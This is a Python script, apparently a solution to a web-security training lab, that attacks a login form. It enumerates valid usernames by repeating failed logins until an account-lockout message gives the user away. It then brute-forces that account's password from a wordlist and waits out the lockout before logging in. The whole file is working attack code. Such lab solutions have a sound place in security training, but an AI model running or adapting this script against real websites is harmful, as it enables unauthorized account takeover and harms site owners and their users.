import requests
import re
import os
import time
from bs4 import BeautifulSoup

def check_login(session, domain, username, password):
    credential = {'username': username, 'password': password}
    r = session.post(domain + '/login', data=credential)
    soup = BeautifulSoup(r.text, 'html.parser')
    # print(soup.prettify())
    try:
        error = soup.find('p', {'class': 'is-warning'}).text
    except AttributeError:
        error = ''
    print(error)
    
    if (error != 'Invalid username or password.'):
        if (error == 'You have made too many incorrect login attempts. Please try again in 1 minute(s).'):
            return 'Valid user'
        else:
            return 'Valid password'
    else:
        return 'Invalid'
    
def brute_username(session, domain, wordlist):
    with open(wordlist, 'r') as f:
        for username in f.readlines():
            username = username.strip()
            print('Trying Username: ', username)
            for _ in range(5):
                if (check_login(session, domain, username, 'password') == 'Valid user'):
                    print('Found Username: ', username)
                    return username

def brute_password(session, domain, username, wordlist):
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            credential = {'username': username, 'password': password}
            print('Trying credential: ', credential)
            if (check_login(session, domain, username, password) == 'Valid password'):
                print('Found credential: ', credential)
                print('Waiting for 1 minute...')
                time.sleep(60)
                print('Trying valid credential: ', credential)
                check_login(session, domain, username, password)
                break
                
def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')
        
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    session = requests.Session()
    try:
        path = os.path.dirname(os.path.abspath(__file__))
        # check_login(session, domain, 'wiener', 'peter')
        username = brute_username(session, domain, os.path.join(path, 'userlist.txt'))
        brute_password(session, domain, username, os.path.join(path, 'passwordlist.txt'))
        verify(session, domain)
    except requests.exceptions.ConnectionError:
        print('Connection Error. Please check your network connection.')
    except:
        print('Something went wrong. Please try again.')